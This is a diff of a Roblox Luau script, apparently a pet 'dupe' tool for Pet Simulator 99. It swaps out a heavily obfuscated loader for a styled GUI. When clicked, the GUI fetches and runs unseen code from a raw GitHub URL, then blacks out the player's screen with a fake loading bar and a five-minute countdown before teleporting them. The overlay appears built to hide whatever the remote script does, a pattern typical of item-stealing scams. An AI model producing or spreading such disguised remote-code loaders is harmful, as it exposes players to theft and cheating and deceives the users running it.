@@ -1,1 +1,175 @@
-return(function(...)local w={"5K8jGK5DuspbVK5PVK5Qun==";"VKYRVyA1EMG=";"oKni4s8KV9Z+Z+5X","c9xxGO==","oFADE6u=","EK5/","5952UKYTUC==","G6sH7g7Ug++enHp7SW==","oMeTE6u=","gR5xGRWHUPqFG4oMU9g=";"EIu=","G6pDUziw","VKY/VzH2oFu=";"o9HxVK7X";"GK7xEKC=";"VziCcz7J";"EKYxoy7+GMb/oC==","s50eUHs+Z4qaTGcFVQQrwkgY/kdr6aHsoqwsGiErRL0wEq6AMlefocedYAC=","VK82EKg=";"g47NpC==","o98jon==";"4s5PtIqi5sAD0FACSsc=","S2OboNX1SO==";"giFwSOmmkwTzcNubxJ22olqJkI9nzrrPN3c3mcFeqntK4JAtqBdCtctuNxxWi522Fwbpd4OZ5G4g";"xyZjNe/XkpJiEgKaws21d8Ip","cwb+on==","";"UsxbG+bsGKHmtHbt","UFq/tzQingesZg8C5n==","eQHz8wJQAQV5BpEtUgc=","FHYwcC==";"SzQe4zuR7+oCVFqJtO==","G95+Ez5+cFpxcMeb";"FHY1EMpb0W==";"SO==";"FHYLozB=";"c9Y/c98+","GM5jE6ob";"o67HcO==","gw7X4g5z4K5Fn51wZHn=";"VH7Lo+jl5FoutKL=";"EIs=","Uz1oow8jSy8MU6Ag";"FHYjoFpxVK82EKg=","typ+GsVbVW==";"0FQREQoAV+77c5A94RQH","5F7bGMixEzg=","GM8/oKYj","Z8O6VPbmV6s6n+jctW==","5F7bGQbs";"VM1XnHpZZg8N0gs9","Ez8+UW==","cFpjUMewEO=="}for S,M in ipairs({{279402-(191329+88072);-642195+642248};{((876929+2676)+-418228)-(855778-(931896-537494)),-938255+938297},{421071+-421028,680818+(98903-(1432792-653124))}})do while M[516732+-516731]<M[-236010-(-236012)]do w[M[671040+-671039]],w[M[496954-((297022+548177)-348247)]],M[-422880-(-579330-(-214384+57935))],M[410822+-410820]=w[M[186851+(-339094-(73216+-225461))]],w[M[-317592-(971273+-1288866)]],M[(608638-(-322261))-930898]+(669898-669897),M[315254+-315252]-(-529852+529853)end end local function S(S)return w[S+(10355-(-21452))]end do local S=string.sub local M=w local J={N=-954853-(-954855),E=717930+-717903,b=-672427-(-672464),["/"]=-512803+512849,["3"]=664634-664572,f=141596-141581,d=21272-21213;o=(-1911840-(-950938))-(-960927),["0"]=-677496+677526,r=962169-(732112-(-229994));s=(788580-(-104316))-892892;I=-941506+941509,v=-169454+169464;O=181062-181030;["5"]=-738652+738673,M=-813685+813723,["8"]=-793651-(-793656);Q=(1335114-790627)+(844091+((434985-733306)+-1090221)),w=(6587-(-24200))-((-178363+353442)-144331),X=-769688+769728,k=632617+((-869210+709811)+-473158);["1"]=56295+((-463813+810166)-402607);U=821291-821265;n=(230154-(-612278))-842416;K=-400857-(-400863);x=(-832254+(1042725+-305963))+95525;["+"]=(424143-(-10906))-(650572+-215575),l=701896-701885;P=-936014-(-936049);W=(-193388-709311)+(259864+642835);p=(-1714780-(-35593-(626187+((-719496+700559)+54709))))-(-1017245),["2"]=-298871-(-189258+-109647),Y=907335-907274,a=(-1130715-((-932078-900446)-(-836584)))+(884501-749684);m=205579-205521,y=(469788-(-438935))+-908716;i=309437-309380,["4"]=509698+(-926644-(-416965)),V=(-903069-(-805190))-(-97908),J=260239+-260196,c=(((-872420+607426)-(-194194-(-720536)))+1350129)+-558769,["6"]=-373774+373829,u=-1014593+1014601;j=-913160-(-913205);R=(483315-160214)-323050,z=760974+-760952;t=-134226+134244;S=868953-868939,["7"]=340002+-339989,F=(-420974+1044902)-(842954+-219049);Z=(-181195+1117327)+-936120;T=-824996+((-589058+2032004)-617903),["9"]=354937+(538476+-893359);G=788395+(-1464141-(-675774)),C=(-984825+1987270)+-1002397;A=238890-238881,B=169519+(296091+-465554);L=548272+-548228;e=500072-500023,D=596403-596353,g=-300513-(-300533),q=894343-894342;H=-21523+(970253+(-433326+(411659+-927010)));h=(-503511-(((-1005497+1302225)+-831860)-(-1371993-(-716373))))-(-624030)}local K=table.concat local i=string.char local a=type local P=string.len local Y=table.insert local v=math.floor for w=950339-((-100747-(-144818))-(-906267)),#M,-956824+(-333+957158)do local k=M[w]if a(k)=="string"then local a=P(k)local m={}local x=117889+-117888 local u=733519-(-46497+780016)local f=-934228-(-934228)while x<=a do local w=S(k,x,x)local M=J[w]if M then u=u+M*((1096305-729155)-367086)^((-635960-(-635963))-f)f=f+(553876+(-751672-(-825201+627404)))if f==-519670-(-519674)then f=-288857+(682223-393366)local w=v(u/(670326+-604790))local S=v((u%(255604-190068))/(-242681-(-242937)))local M=u%(-471834+472090)Y(m,i(w,S,M))u=-350827+350827 end elseif w=="="then Y(m,i(v(u/(563378-((674707-319316)+142451)))))if x>=a or S(k,x+(-608797+(-696706+1305504)),x+(-94559-(-94560)))~="="then Y(m,i(v((u%(984116+-918580))/(593832+(729890+(759442+-2082908))))))end break end x=x+(((184194-(-530220))+-1098044)-(-383631))end M[w]=K(m)end end end return(function(w,J,K,i,a,P,Y,Z,x,k,f,l,z,M,C,V,e,u,v,L,m)v,M,V,L,l,f,e,k,x,m,C,u,z,Z={},function(M,K,i,a)local d,s,E,o,B,j,W,D,H,q,U,h,X,g,p,F,f,N,u,t,b,x,e,O,y,Q,Y,r,c,I,k,G,R,T while M do if M<8474046-(-1024375)then if M<3721605-(-693442)then if M<2391404-200100 then if M<-338237-(-988521)then if M<625480-95544 then if M<41946-(-119612)then if M<-932169+1031062 then R=S(-184906-(-153100))D=w[R]R=S((1182648-(99585-(-654703)))+-460152)E=D[R]I=g D=E(k,I)E=v[i[709006+-709000]]R=E()c=D+R N=c+B c=-736144-(-736400)M=3670009-(-1193242-(-926549))I=nil T=N%c B=T c=u[x]R=-912976-(-912977)D=B+R E=f[D]N=c..E u[x]=N else d=S(-12729+-19025)M=w[d]d=S(602562+(383351-1017689))w[d]=M M=343533+9166132 end else M=true M=M and 828715+10666805 or 10142256-(1008228-318882)end else if M<676949+-73811 then T=S(-807368+775569)Q=w[T]T=S(293651+-325453)y=Q[T]t=y M=23157+(11208676-((-1923244-(-519489))-(-535541)))else M=969954+-484985 end end else if M<554613+657141 then if M<93822+722070 then I=S(-98859+67053)e=(-516152+35184371640789)-(-964195)M={}g=391795-391794 v[i[-635999-(-636001)]]=M Y=v[i[-389158-(-389161)]]f=Y Y=x%e G=1002627-1002372 v[i[(345814-(-503688))-849498]]=Y B=x%G G=-451269-(-451271)e=B+G v[i[427155-(1344086-916936)]]=e G=w[I]I=S(-854968-(-823209))B=G[I]G=B(k)t=G B=S(-733837-(-702046))y=g u[x]=B I=739006+-739005 g=-642719-((-971188+(984382-(-915027-(-888453))))-682487)Q=y<g M=-304085+4240787 g=I-y B=(-560065+952148)-392040 else D=y==Q M=-592545+5504901 E=D end else if M<979705+658818 then h=(-1211007-(-437888))+773121 p=j[h]h=v[o]r=p==h F=r M=7402682-(-800297)else k=nil M=15552641-853263 v[i[-786511-(-786516)]]=Y end end end else if M<(585100+-960145)+3851083 then if M<491790+2133231 then if M<2348353-(-90562)then if M<2987088-622862 then M=l(405271+203013,{f})D={M()}Y={J(D)}M=w[S(-384884+(1309443-(-82370-(-79551+-959147))))]else x=-636835+636836 M={}u=v[i[(-1253471-((-880635+806309)+-802611))+376543]]f=u u=661882+-661881 k=M e=u M=-988020+17529167 u=318780-318780 B=e<u u=x-e end else M=v[i[-935339-(-482407+-452933)]]x=K[339712-339710]k=K[1002991+-1002990]u=M M=u[x]M=M and 613200+8032224 or 1555558-886718 end else if M<961261+2098320 then c=#T M=-927326+17641987 d=-435965-(-435965)N=c==d else x=S(281312+-313110)u=((274543+(-4987-(-725135+(-832383+(-215418+(583704+1592665))))))+9435642)-(-55280)k=x^u Y=7905724-(-922149)M=Y-k k=M Y=S(-621762+589997)M=Y/k Y={M}M=w[S(570470+(-1514592-(-912336)))]end end else if M<((-406292-(-381380))-544199)+4530213 then if M<3867774-(-59117)then M=v[i[-872091+872101]]x=v[i[498777-498766]]k[M]=x M=v[i[-653414-(-1273995-(-620569))]]x={M(k)}Y={J(x)}M=w[S(800065+-831855)]else g=g+y T=not Q I=g<=t I=T and I T=g>=t T=Q and T I=T or I T=-761540+834818 M=I and T I=13211759-(-604341+1597898)M=M or I end else if M<-637691+(4259631-(-647594))then F=v[x]Y=F M=F and-914762+(13900116-8774)or(-1784794-(-989760))+(-890642+7403620)else y=-547881-(-354327+-193619)t=m()v[t]=Y M=v[G]g=-851610+851613 Y=M(g,y)M=775918-775918 g=m()v[g]=Y y=M N=C(5476740-319656,{})M=(-872210-131597)-(-1003807)T=S(-656417-((238443+(150051-693426))-319682))Q=M Y=w[T]R=S(-534538+502775)T={Y(N)}Y=(-1029660+1456811)-(357674+69475)M={J(T)}T=M M=T[Y]Y=S(-566865+(597305-62245))N=M M=w[Y]c=v[u]D=w[R]R=D(N)D=S(((-359215+-64703)+-302984)-(-695107))E=c(R,D)c={E()}Y=M(J(c))c=m()v[c]=Y E=v[g]D=E Y=-253208+(-925310+1178519)E=-850825-(-850826)R=E E=-526185+526185 d=R<E E=Y-R M=4647965-(-671748)end end end end else if M<6984551-257135 then if M<4714708-(-726708)then if M<570902+4592012 then if M<5754191-614255 then if M<(4766170-(-942911))-((882045+(127287+546527))-754728)then v[x]=F O=((1387243-699301)-425059)-(787938+-525056)h=v[q]p=h+O r=j[p]b=y+r r=771916-(1266609-494949)M=b%r p=v[X]r=Q+p y=M p=((-1718960-(-427380))-(-442636))+849200 b=r%p M=-203996+9575049 Q=b else v[x]=E M=v[x]M=M and-162476+5527298 or-72572+13823077 end else x=S(578442+-610219)u=(6596650-(-610385))-(-775810)Y=16435327-974438 k=x^u M=Y-k Y=S(-923706+891934)k=M M=Y/k Y={M}M=w[S((547429+(-412897-(-747117)))+-913406)]end else if M<(4437893-28948)-(-955728)then E=E+R s=not d Y=E<=D Y=s and Y s=E>=D s=d and s Y=s or Y s=841443+13576262 M=Y and s Y=-568196+14254813 M=M or Y else M=9909161-(399305+-520336)end end else if M<-762234+6496507 then if M<6334744-808208 then B=Y G=S(125670-(-195856+353292))Y=w[G]G=S(830073-(241357-(-620486)))M=Y[G]I=S(-71739+39940)G=m()v[G]=M Y=w[I]I=S(-843139-(-811358))M=Y[I]I=M Q=S((536386+(984353+-1000880))+-551658)y=w[Q]g=M t=y M=y and-162147-(-756521)or(591597+11529608)-(-928159-(-949317))else M=710+9370343 v[x]=Y end else if M<5139563-(-1111769-(-91298))then g=S(401192-432994)t=w[g]Y=t M=-208654+4483049 else u=v[i[-68748-(-68754)]]M=(338449+1746259)-47988 x=u==k Y=x end end end else if M<7867912-(-748213)then if M<(-599833+-375603)+9125149 then if M<7826242-(-165579)then if M<7844530-(1422934-956302)then x=v[i[-632466-((182170+-482529)+-332109)]]u=v[i[606146+-606143]]k=x==u M=-518106+12024698 Y=k else u=S(-618823-(-587024))x=w[u]u=S((467472+-387786)-111466)k=x[u]u=v[i[419928+-419927]]x={k(u)}Y={J(x)}M=w[S(120360-152135)]end else M=(3662444-(-790554))-(-994826)B=v[e]Y=B end else if M<(-749261+9861649)-673009 then Y=F M=b M=-426121+6144065 else M=w[S((-32070+423698)+-423395)]Y={}end end else if M<9163088-(-151801)then if M<-892555+(9195354-(-551560))then M=669337+13605158 else b=v[x]M=b and 10943775-(-461587)or(-228243+121662)+4717369 F=b end else if M<-681728+10072864 then W=z(W)s=z(s)o=z(o)j=nil H=z(H)M=(5258123-864350)-(-925940)X=z(X)q=z(q)else Y={}M=w[S(-569155-(-537377))]end end end end end else if M<13412311-(-238681)then if M<11897342-176748 then if M<9500218-(-619120)then if M<9248713-(((-559360+901447)+-1331282)+(((507010+-200292)+926888)-((-204184+999861)+-89317)))then if M<(-390967+692668)+9295097 then if M<487264+9055893 then M=84334+13104892 else M=true Y={}v[i[636315+(-702608-(-66294))]]=M M=w[S(-178545+146790)]end else x=v[i[-435416-(-435419)]]u=1021660-(1143708-122080)y=(1010492+-514906)-495573 t=-879121+879123 k=x%u f=v[i[-988847-(-988851)]]G=v[i[-521271-(92038-613311)]]N=v[i[217731+(724377+-942105)]]T=N-k N=(174297+(284461+-363312))-95414 Q=T/N g=y-Q I=t^g B=G/I e=f(B)y=-661416-(-661672)f=-137455+4295104751.0 u=e%f e=50566+-50564 f=e^k x=u/f I=-753093-(-753094)f=v[i[-494230+494234]]t=-908329+908585 G=x%I I=(-1001102+4295664936.0)-(-424714+121252)B=G*I e=f(B)f=v[i[-227227-(-227231)]]B=f(x)u=e+B k=nil e=939237-873701 f=u%e B=u-f G=661631+-596095 e=B/G u=nil x=nil G=-908690-(-908946)B=f%G I=f-B G=I/t t=947031+-946775 f=nil I=e%t g=e-I t=g/y g={B;G;I;t}B=nil v[i[(1107295-703703)+-403591]]=g e=nil I=nil G=nil M=-573289+8048315 t=nil end else if M<-202029+10210753 then x=v[i[-575875+575877]]u=(331649+-803215)-(-471683)k=x*u x=14232964507318-(265178+(242349+-486812))Y=k+x k=451694+35184371637138 x=-68777+68778 M=Y%k v[i[(1037196+-2049772)+1012578]]=M k=v[i[-99557+99560]]Y=k~=x M=14752462-(-1619895-(-578109))else y=nil I=nil I=S(-411599+379800)Q=nil u=z(u)T=nil c=z(c)N=nil e=z(e)x=z(x)g=z(g)B=nil u=nil f=z(f)t=z(t)B=S((1373099-907354)+-497511)M=15204427-(-491494)t=S(1043671+-1075477)x=nil e=w[B]G=z(G)c=-438623-(-438879)T={}B=S(-436085+404329)f=e[B]e=m()v[e]=f G=S(-21864-9902)g=m()B=w[G]G=S(-309144+277374)f=B[G]N=-735871+735872 G=w[I]y={}I=S(-162191-(-130411))B=G[I]I=w[t]t=S((-170218+-341742)+480199)d=c G=I[t]I=((-756479+1286339)+(729869+-2257227))-((-36405-66849)+(785230+-1679474))t=m()v[t]=I I=(-125043-914003)-(-1039048)v[g]=I I={}c=-640281+(1136060-495778)Q=m()v[Q]=y y=730196-(16632+713564)s=c c=-176477+176477 H=s<c c=N-s end end else if M<10892810-(-523234)then if M<(((553426-(-19623-(150653+-166765)))+698503)-((680479-(-470382))-318216))+10679485 then k=S(-1013043-(-981283))M=w[k]u=-855766+((716316-754166)-(-893616))x=v[i[-374096+374104]]k=M(x,u)M=-342285+2780746 else r=-347899-(-347900)M=-283838+4894626 b=j[r]F=b end else if M<11716427-211370 then Y=S((-198135+749270)+-582889)M=w[Y]k=S(-576719+544943)Y=w[k]k=S(974220-(-739794+1745790))w[k]=M k=S(-720914+689160)w[k]=Y k=v[i[945407-((-548677+(626339-101112))+(15758+953098))]]x=k()M=533402-48433 else M=Y and(-145485-(-437518))+13744036 or 14856852-157474 end end end else if M<(((13186273-413392)-440768)-(697466+(-2089662-(-498122))))-507492 then if M<12659462-(-823555+1208621)then if M<-1048443+13172822 then if M<12533412-((668335+456105)-537422)then x=m()k=K f=m()u=S((((356643-942212)+1107652)-(230282-112451))-436058)M=true v[x]=M Y=w[u]u=S(976591-1008395)M=Y[u]G=S(-957518+925715)u=m()v[u]=M M=C(937199+13846760,{})e=m()I=L(825742+(-920384+9685197),{e})v[f]=M M=false v[e]=M B=w[G]G=B(I)Y=G M=G and 9068352-1032724 or(800812+4208194)-(-438818)else Y=t M=g M=t and 3565384-(-709011)or 5410417-(-445837)end else G=nil M=628896+13645599 f=nil B=nil end else if M<148502+12462748 then f=nil c=m()s=m()r=nil X={}I=nil j=S(152970-184744)N={}d=L((-923366-(-9498))+16018171,{c;t;g,e})v[c]=N y=nil N=m()e=z(e)v[N]=d W=S(604993-636777)d={}B=nil v[s]=d B=S(-721687-(-101276+-588623))Y={}I=5792321060236-(-199827)H=S(695964-727749)d=w[H]o=v[s]q={[W]=o;[j]=r}H=d(X,q)G=nil x=H T=nil G=(31573582059491-(575742+-1456483))-402798 d=V(522388+(653250+(1001369-((-64396+247987)-498501))),{s;c;Q;t,g;N})s=z(s)Q=z(Q)g=z(g)T=S(198020+-229814)t=z(t)u=d N=z(N)e=u(B,G)c=z(c)g=S(35222-67019)t=21023505109971-(-870012)f=x[e]e=S(18227+-49998)M=w[S(-532632+500843)]w[e]=f G=S(319189+((237404-751165)-(-162772)))B=u(G,I)e=x[B]I=S(-333087-(-301294))N=13622459948179-(-208683)B=S(-688960-(-657202))w[B]=e G=u(I,t)B=x[G]I=S(114448+-146249)G=S(508560-540328)w[G]=B G=w[I]t=w[g]Q=u(T,N)y=x[Q]Q=S((703944+(-1727477-(-398399)))+593361)Q=t[Q]u=nil g={Q(t,y)}I=G(J(g))x=nil G=I()else x=v[i[555588-555585]]u=-38916-(-38917)k=x~=u M=k and 9320541-(-277527)or 16215708-421460 end end else if M<-367176+13411510 then if M<399971+(214906+12348619)then N=c X=N T[N]=X N=nil M=14897824-(-522495+(134357+-409959))else b=M h=190400+((-436117-(-1056448-(-344760+(-968639+595121))))+(-446792+(306331-(-48009))))p=j[h]h=false r=p==h F=r M=r and(-973175+1686721)+789020 or(569846-(-459165))+7173968 end else if M<14490129-955178 then M=true M=M and 15580791-((-766549-(314259-122106))+(186232+-24732))or 544743+(208199+7789550)else M=true M=M and 14830129-770854 or-489072+((175762-172313)+2843766)end end end end else if M<-289158+(-737515+15764159)then if M<-556019+14632299 then if M<-987084+(14206715-(-750010))then if M<12764076-(-1884875-(-853688))then if M<(433972+(589848-525811))+13230781 then D=v[x]E=D M=D and(375645-680714)+1361547 or-40145+4952501 else M=true M=-474862+2833005 end else s=S(-525531-(-493755))R=S(-90660+58897)M=w[R]d=w[s]R=M(d)M=S(((-458086+(-929555+2912812))-909289)+-647636)w[M]=R M=((295678+-1421765)-(-794813))+9840939 end else if M<13814058-(-225395)then Y=S((-850253-(-651424))-(-167024))M=w[Y]I=S(529203-561006)t=Z(4177260-1044368,{})f=S(603093-634856)k=v[i[98763+-98759]]u=w[f]G=w[I]I={G(t)}G=-144191+144193 B={J(I)}e=B[G]f=u(e)u=S(910503+(843735+-1786033))x=k(f,u)k={x()}Y=M(J(k))x=v[i[(347473+357317)-704785]]M=x and 5345119-(-1007801+155876)or 553800+1482920 k=Y Y=x else M=12959870-(704849-(523127-(660630+-1071708)))end end else if M<608422+13793231 then if M<(13969460-(-347576))-162520 then M=v[i[(341264-(-523163))-864426]]t=403860-403605 I=-336490+(-551235-(-887725))x=u G=M(I,t)k[x]=G x=nil M=17098786-557639 else Y={x}M=w[S(-1036257+1004495)]end else if M<13930283-(-729877)then s=m()v[s]=E j=-927520+927522 H=S((-408675+502417)-125508)Y=w[H]X=77925-77825 H=S(791252+((-320986-116037)-385999))M=Y[H]H=-235384+(-73917-((-256464-((-449989+(539800-448277))+835204))+423900))Y=M(H,X)q=389443-389188 X=((516980+-1317286)-(-148711))-(-651595)H=m()v[H]=Y M=v[G]Y=M(X,q)r=S((-324401+1118452)+-825814)X=m()v[X]=Y q=-139415-(-139416)M=v[G]W=v[H]Y=M(q,W)q=m()v[q]=Y O=-204761-(-204761)Y=v[G]o=-373232+373233 W=Y(o,j)Y=909109-(87792+((103457+1154976)-437117))U=-386072-(-396072)M=W==Y W=m()v[W]=M M=S(361724-(-38312-(-431815)))j=S(-123709-(331331-423257))Y=S(467802-499597)b=w[r]p=v[G]h={p(O,U)}r=b(J(h))b=S(894922-926705)F=r..b M=N[M]o=j..F M=M(N,Y,o)j=S(-655011-(-623208))o=m()F=L(((388565+-830201)+(974156+15876049))-(-18092),{G,s,g;u;x;c,W,o;H;q;X;t})v[o]=M Y=w[j]j={Y(F)}M={J(j)}j=M M=v[W]M=M and 4962747-861905 or 8625036-(-609437)else M=v[i[852192+(8560+-860745)]]M=M and 364007+((-465064-(-67346))+10786997)or 2752417-313956 end end end else if M<16889471-(347081+193939)then if M<(15883568-196593)-(-65557)then if M<847203+14588424 then if M<-792614+(15434919-(-237183))then k=S(707259-739023)Y=S(746989+-778749)M=w[Y]Y=M(k)M=w[S(644221-676017)]Y={}else k=v[i[195025-195024]]Y=#k k=921542+-921542 M=Y==k M=M and(393188+8898783)-(-493734)or 180562+7294464 end else X=not H c=c+s N=c<=d N=X and N X=c>=d X=H and X N=X or N X=13005042-88439 M=N and X N=1810264-(-1010814)M=M or N end else if M<707080+15281890 then x=v[i[-461450+461453]]u=-9473-(728495+(762905+-1500929))k=x*u x=-219193-(-219450)M=625864+12047415 Y=k%x v[i[-392979+392982]]=Y else d=-914697+914697 c=#T N=c==d M=N and 213577+(331244+11860189)or(-441830+1371469)+15785022 end end else if M<585793+15953188 then if M<16736998-332299 then R=(-82310-717600)+799911 M=v[G]d=-657151+(1495240-838083)D=M(R,d)M=S(411652+-443406)d=S(-115597+83843)w[M]=D R=w[d]d=(280842+-971121)+690281 M=R>d M=M and(173153-(-671749+(383407-(-600085))))+13992886 or-777515+885931 else e=746117-746115 f=676937+-676936 x=v[i[-164027+164028]]u=x(f,e)x=(133594-(-227490+-90499))+-451582 k=u==x Y=k M=k and 12339824-833232 or 440577+6556977 end else if M<-211564+(416675+16423421)then u=u+e G=not B x=u<=f x=G and x G=u>=f G=B and G x=G or x G=591676+13534030 M=x and G x=-973692+4758126 M=M or x else d=#T c=947889+((382377-(-914236+1897722))-(-705821+1052600))X=-801582-(-801583)N=f(c,d)c=B(T,N)d=v[Q]H=c-X N=nil M=16509369-339040 s=G(H)d[c]=s c=nil end end end end end end end M=#a return J(Y)end,function(w,S)local J=u(S)local K=function(K,i,a)return M(w,{K;i;a},S,J)end return K end,function(w,S)local J=u(S)local K=function(K)return M(w,{K},S,J)end return K end,function(w,S)local J=u(S)local K=function()return M(w,{},S,J)end return K end,function(w)local S,M=(655277+47713)-702989,w[-294140+((-847357+2149899)-1008401)]while M do k[M],S=k[M]-(-845736+845737),(-296356-(-296357))+S if k[M]==633978+-633978 then k[M],v[M]=nil,nil end M=w[S]end end,function(w,S)local J=u(S)local K=function(...)return M(w,{...},S,J)end return K end,{},819094+-819094,function()x=(-700510-(-700511))+x k[x]=969948+-969947 return x end,function(w,S)local J=u(S)local K=function(K,i,a,P,Y)return M(w,{K,i;a,P,Y},S,J)end return K end,function(w)for S=((1480628-767441)-951794)+238608,#w,715860+-715859 do k[w[S]]=k[w[S]]+(100207+(916100+(-101927+-914379)))end if K then local M=K(true)local J=a(M)J[S(160303+-192087)],J[S((613885+-1354805)+709133)],J[S(-288953-(-257171))]=w,f,function()return 479455-594469 end return M else return i({},{[S(587451+-619238)]=f;[S(439120-470904)]=w,[S(254813+(-742863-(-456268)))]=function()return-575854+460840 end})end end,function(w)k[w]=k[w]-(((509017-((-779750-(-1048986-(-356980)))-88073))-532503)+(-280428-(797447+-925545)))if k[w]==-822691-(-822691)then k[w],v[w]=nil,nil end end,function(w,S)local J=u(S)local K=function(K,i)return M(w,{K,i},S,J)end return K end return(e(12594568-652162,{}))(J(Y))end)(getfenv and getfenv()or _ENV,unpack or table[S(-196638-(-164836))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+-- Prevent double execution
+if _G.YoshidaaHubRunning then return end
+_G.YoshidaaHubRunning = true
+
+-- Services
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local TeleportService = game:GetService("TeleportService")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "YoshidaaPremiumGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- Blur Effect
+local blur = Instance.new("BlurEffect")
+blur.Size = 24
+blur.Parent = Lighting
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 400, 0, 250)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+mainFrame.BackgroundTransparency = 0.2
+mainFrame.Parent = screenGui
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 20)
+
+local glow = Instance.new("UIStroke", mainFrame)
+glow.Thickness = 2
+glow.Color = Color3.fromRGB(160, 80, 255)
+glow.Transparency = 0.1
+
+-- Title
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Text = "Dupe "
+title.TextColor3 = Color3.fromRGB(200, 100, 255)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+
+-- Footer
+local inspired = Instance.new("TextLabel", mainFrame)
+inspired.Size = UDim2.new(1, -20, 0, 20)
+inspired.Position = UDim2.new(0, 10, 1, -25)
+inspired.Text = "5ive.S-H-A-R-K"
+inspired.TextColor3 = Color3.fromRGB(140, 140, 140)
+inspired.BackgroundTransparency = 1
+inspired.Font = Enum.Font.Gotham
+inspired.TextSize = 14
+inspired.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Activate Button
+local button = Instance.new("TextButton", mainFrame)
+button.Size = UDim2.new(0.85, 0, 0, 44)
+button.Position = UDim2.new(0.075, 0, 0.55, 0)
+button.Text = " Kích Hoạt"
+button.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.Gotham
+button.TextSize = 18
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
+
+local btnStroke = Instance.new("UIStroke", button)
+btnStroke.Thickness = 2
+btnStroke.Color = Color3.fromRGB(255, 100, 255)
+btnStroke.Transparency = 0.3
+
+-- Hover Animation
+button.MouseEnter:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+		Size = UDim2.new(0.9, 0, 0, 50)
+	}):Play()
+	btnStroke.Transparency = 0
+end)
+
+button.MouseLeave:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+		Size = UDim2.new(0.85, 0, 0, 44)
+	}):Play()
+	btnStroke.Transparency = 0.3
+end)
+
+-- Activation Logic
+button.MouseButton1Click:Connect(function()
+	button.Text = "✅ Kích Hoạt..."
+	button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
+
+	-- Load PetsDuped script
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cuong11a/PS99/refs/heads/main/DupingExculsivePet"))()
+
+	-- Black Loading Overlay
+	task.delay(0.01, function()
+		local gui = Instance.new("ScreenGui", CoreGui)
+		gui.Name = "YoshidaaBlackLoading"
+		gui.IgnoreGuiInset = true
+		gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+		local frame = Instance.new("Frame", gui)
+		frame.BackgroundColor3 = Color3.new(0, 0, 0)
+		frame.Size = UDim2.new(1, 0, 1, 36)
+		frame.Position = UDim2.new(0, 0, 0, -36)
+		frame.ZIndex = 999999
+		frame.BackgroundTransparency = 1
+		TweenService:Create(frame, TweenInfo.new(0.5), {
+			BackgroundTransparency = 0
+		}):Play()
+
+		local gradient = Instance.new("UIGradient", frame)
+		gradient.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 0, 60)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 20))
+		})
+		gradient.Rotation = 90
+
+		local msg = Instance.new("TextLabel", frame)
+		msg.Size = UDim2.new(1, 0, 0, 50)
+		msg.Position = UDim2.new(0, 0, 0.45, 0)
+		msg.Text = "🔍 Tìm Server ID cổ..."
+		msg.TextColor3 = Color3.fromRGB(255, 255, 255)
+		msg.BackgroundTransparency = 1
+		msg.Font = Enum.Font.GothamBold
+		msg.TextScaled = true
+		msg.ZIndex = 999999
+
+		local percent = Instance.new("TextLabel", frame)
+		percent.Size = UDim2.new(1, 0, 0, 30)
+		percent.Position = UDim2.new(0, 0, 0.55, 0)
+		percent.Text = "Loading 0%"
+		percent.TextColor3 = Color3.fromRGB(180, 180, 255)
+		percent.BackgroundTransparency = 1
+		percent.Font = Enum.Font.Gotham
+		percent.TextScaled = true
+		percent.ZIndex = 999999
+
+		-- Countdown Logic
+		task.spawn(function()
+			for i = 1, 100 do
+				percent.Text = "Loading " .. i .. "%"
+				task.wait(0.1)
+			end
+
+			percent.Visible = false
+			msg.Text = "🕒 Đợi Vài Giây Random ID Dupe Pet"
+
+			local countdown = Instance.new("TextLabel", frame)
+			countdown.Size = UDim2.new(1, 0, 0, 40)
+			countdown.Position = UDim2.new(0, 0, 0.63, 0)
+			countdown.TextColor3 = Color3.fromRGB(255, 200, 200)
+			countdown.BackgroundTransparency = 1
+			countdown.Font = Enum.Font.GothamBold
+			countdown.TextScaled = true
+			countdown.ZIndex = 999999
+
+			local totalTime = 300
+			while totalTime >= 0 do
+				countdown.Text = string.format("Rejoin in %02d:%02d", math.floor(totalTime / 60), totalTime % 60)
+				task.wait(1)
+				totalTime = totalTime - 1
+			end
+
+			msg.Text = "AUTO RE-JOIN START"
+			countdown.Text = ""
+			task.wait(2)
+
+			TeleportService:Teleport(game.PlaceId)
+		end)
+	end)
+end)
